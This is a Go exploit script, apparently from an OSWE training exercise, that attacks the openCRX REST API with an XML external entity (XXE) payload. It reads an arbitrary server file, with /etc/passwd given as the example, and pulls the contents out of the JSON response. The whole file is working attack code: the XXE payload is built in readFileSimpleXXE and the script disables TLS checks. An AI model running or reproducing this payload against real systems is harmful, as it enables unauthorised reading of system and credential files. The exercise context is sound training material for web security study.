package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"github.com/iPhantasmic/OSWE/scripts/utils"
	"github.com/tidwall/gjson"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
)

// Ex 9.3.6.3 - Extra Mile: Parse file read from XXE

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func readFileSimpleXXE(debug bool, ip, username, password, filename string) {
	requestURL := fmt.Sprintf("http://%s:8080/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account", ip)

	xmlPayload := fmt.Sprintf("<?xml version=\"1.0\"?>\n"+
		"<!DOCTYPE data [\n"+
		"<!ELEMENT data ANY >\n"+
		"<!ENTITY lastname SYSTEM \"file://%s\">\n"+
		"]>\n"+
		"<org.opencrx.kernel.account1.Contact>\n"+
		"\t<lastName>&lastname;</lastName>\n"+
		"\t<firstName>Tom</firstName>\n"+
		"</org.opencrx.kernel.account1.Contact>", filename)

	request := utils.PostRequest{
		AuthUser:    username,
		AuthPass:    password,
		ContentType: "xml",
		Cookies:     []*http.Cookie{},
		FormData:    url.Values{},
		Headers:     map[string]string{"Accept": "application/json"},
		XmlData:     []byte(xmlPayload),
	}

	utils.PrintInfo("Sending XXE exploit now...")
	response := utils.SendPostRequest(client, debug, requestURL, request)

	jsonResponse := response.ResponseBody
	if response.StatusCode == 200 {
		result := gjson.Get(jsonResponse, "lastName")
		utils.PrintSuccess(fmt.Sprintf("Contents of %s:\n"+result.String(), filename))
	} else {
		utils.PrintInfo(fmt.Sprintf("Non-200 HTTP Response Code: %d", response.StatusCode))
		utils.PrintInfo(jsonResponse)
	}
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 5 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-debug=true] [-proxy=true] <target> <username> <password> <filename>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.236.126 guest password /etc/passwd", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)
	username := flag.Arg(1)
	password := flag.Arg(2)
	filename := flag.Arg(3)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// cookie jar to help us manage cookies
	jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatalln("Error while creating cookie jar", err)
	}

	// create our HTTP client using the above transport and cookie jar, then set the global variable
	client = &http.Client{
		Transport: tr,
		Jar:       jar,
	}

	readFileSimpleXXE(*debug, ip, username, password, filename)

	fmt.Println("")
	utils.PrintSuccess("Done!")
}
